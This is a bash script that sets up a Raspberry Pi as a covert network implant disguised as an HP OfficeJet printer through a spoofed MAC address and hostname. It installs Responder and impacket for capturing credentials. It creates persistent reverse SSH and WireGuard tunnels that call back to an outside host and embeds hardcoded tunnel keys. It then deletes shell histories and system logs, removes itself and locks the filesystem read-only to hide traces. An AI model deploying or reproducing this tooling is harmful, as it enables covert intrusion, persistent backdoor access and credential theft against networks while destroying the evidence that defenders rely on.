#!/bin/bash
set -e # Exit on any error

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    log "ERROR" "This script must be run as root (or with sudo)."
    exit 1
fi

# Check if the OS is Debian GNU/Linux 12 (bookworm)
if [[ $(lsb_release -d | awk '{print $2, $3, $4, $5}') != "Debian GNU/Linux 12 (bookworm)" ]]; then
    log "ERROR" "This script is compatible with Debian GNU/Linux 12 (bookworm)."
fi

CALLBACK_DOMAIN="example.com"
NEW_HOSTNAME="OfficeJet102"
SSH_KEY_PATH="/root/.ssh/id_rsa"
AUTHORIZED_KEYS_PATH="/root/.ssh/authorized_keys"
NEW_MAC="00:30:C1:2B:BA:67" # Make it look like a HP printer MAC
SCRIPT_PATH="$0"            # Get the path to this script

# Define ANSI color codes
COLOR_RESET="\e[0m"
COLOR_INFO="\e[32m"  # Green for INFO
COLOR_ERROR="\e[31m" # Red for ERROR

# Function to log colored messages with timestamps and log levels
log() {
    timestamp=$(date +"%Y-%m-%d %T")
    if [ "$1" == "INFO" ]; then
        echo -e "[$timestamp] ${COLOR_INFO}[INFO] $2${COLOR_RESET}"
    elif [ "$1" == "ERROR" ]; then
        echo -e "[$timestamp] ${COLOR_ERROR}[ERROR] $2${COLOR_RESET}"
    else
        echo -e "[$timestamp] [UNKNOWN] $2"
    fi
}

# Remount partition so we can write /boot/config.txt files for raspi-config
log "INFO" "Remounting partitons as RW..."
mount -o remount,rw /boot/firmware
mount -o remount,rw /

# Modify /boot/cmdline.txt to set the new MAC address
if grep -q "force_mac_address=$NEW_MAC" /boot/config.txt; then
    log "WARN" "MAC address already set to $NEW_MAC in /boot/config.txt."
else
    log "INFO" "Setting MAC address to $NEW_MAC in /boot/config.txt..."
    echo "force_mac_address=$NEW_MAC" >>/boot/config.txt
fi

# Generate SSH key non-interactively if it doesn't exist
if [ ! -f "$SSH_KEY_PATH" ]; then
    log "INFO" "Generating SSH key pair..."
    ssh-keygen -t rsa -N "" -f "$SSH_KEY_PATH"
    chmod 600 "$SSH_KEY_PATH"
    chmod 644 "$SSH_KEY_PATH.pub"
fi

# Add the generated public key to authorized_keys if not already present
if ! grep -q "$(cat "$SSH_KEY_PATH.pub")" "$AUTHORIZED_KEYS_PATH"; then
    log "INFO" "Adding the public key to authorized_keys..."
    cat "$SSH_KEY_PATH.pub" >>"$AUTHORIZED_KEYS_PATH"
fi

log "INFO" "Restricting root login to keys only"
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config

log "INFO" "Restricting SSH login to a root user..."
echo "AllowUsers root" >> /etc/ssh/sshd_config

log "INFO" "Restarting SSH service..."
systemctl restart sshd.service

log "INFO" "Disable the default pi user"
usermod -L $(id -un 1000)

log "INFO" "Updating package list and upgrading installed packages..."
apt update
apt upgrade -y tmux tcpdump vim nmap curl git python3-impacket python3-full python3-pip openvpn wireguard dnsutils whois traceroute 

log "INFO" "Installing Responder..."
git clone https://github.com/lgandx/Responder.git
cd Responder
python -m pip install -r requirements.txt
cd ..

log "INFO" "Updating the Pi firmware..."
rpi-eeprom-update -a

# This is broken - after it updates it opens the UI and halts the script
# I think it's updated by apt update anyway
# log "INFO" "Updating Raspberry Pi firmware..."
# raspi-config nonint do_update

log "INFO" "Expanding the root filesystem..."
raspi-config nonint do_expand_rootfs

log "INFO" "Setting the hostname..."
raspi-config nonint do_hostname "${NEW_HOSTNAME}"

log "INFO" "Enabling SSH..."
raspi-config nonint do_ssh 0

log "INFO" "Disabling Serial..."
raspi-config nonint do_i2c 1

log "INFO" "Disabling VNC..."
raspi-config nonint do_vnc 1

log "INFO" "Disabling serial..."
raspi-config nonint do_serial 1

log "INFO" "Disabling extra services, bluetooth, avahi, apt-daily..."
systemctl disable --now bluetooth.service
systemctl disable --now avahi-daemon.socket
systemctl disable --now avahi-daemon.service
systemctl disable --now apt-daily-upgrade.timer
systemctl disable --now apt-daily-upgrade.service

# SSH tunnel callback
# Add "GatewayPorts clientspecified" to the server
log "INFO" "Setting up SSH tunnel callback..."
cat <<EOF >/etc/systemd/system/ssh-cb@.service
[Unit]
Description=SSH
After=network.target

[Service]
ExecStartPre=/bin/sleep 198
ExecStart=/usr/bin/ssh -i "${SSH_KEY_PATH}" -NT -R *:0 -l user "${CALLBACK_DOMAIN}" -p %i -o "StrictHostKeyChecking no"
Restart=always
RestartSec=10
StartLimitInterval=0
TimeoutStartSec=300

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ssh-cb@22.service
systemctl enable ssh-cb@443.service

# Wireguard tunnel callback
log "INFO" "Setting up Wireguard tunnel callback..."
cat <<EOF >/etc/wireguard/wg0.conf
[Interface]
Address = 192.168.123.129/32
PrivateKey = iGTEfLP+MThNDFQNj6oDIe2+p+54MK6C5IOJKBXj2F8=

[Peer]
PublicKey = HIKQBed2dXWiA5V8xeJQV+a+ltW95mUOqrr+tyVCmlQ=
PresharedKey = Bz/2b24dNtnMajD8fk+GNWsOns7k3f9McTPCBAM/Ezo=
Endpoint = ${CALLBACK_DOMAIN}:443
AllowedIPs = 192.168.123.128/32
PersistentKeepalive = 300
EOF

systemctl daemon-reload
systemctl enable wg-quick@wg0.service

touch /root/.hushlogin

log "INFO" "Clearing bash history..."
history -c
# find /home /root -type f \( -name ".bash_history" -o -name ".zsh_history" -o -name ".fish_history" \) -exec truncate -s 0 '{}' \;
find /home /root -type f \( -name ".bash_history" -o -name ".zsh_history" -o -name ".fish_history" \) -delete

log "INFO" "Clearing files in /var/log/..."
find /var/log/ -type f -delete
journalctl --rotate
journalctl --vacuum-time=1s

# Delete this script before making filesystem RO
log "INFO" "Deleting this script..."
rm -f "$SCRIPT_PATH"

log "INFO" "Enabling Overlay Filesystem..." # (Read-only filesystem)
raspi-config nonint do_overlayfs 0          # 0 is enable

log "INFO" "Here is your private key:"
cat "$SSH_KEY_PATH"

log "INFO" "Here is your public key:"
cat "$SSH_KEY_PATH.pub"

log "INFO" "Rebooting the Raspberry Pi..."
reboot
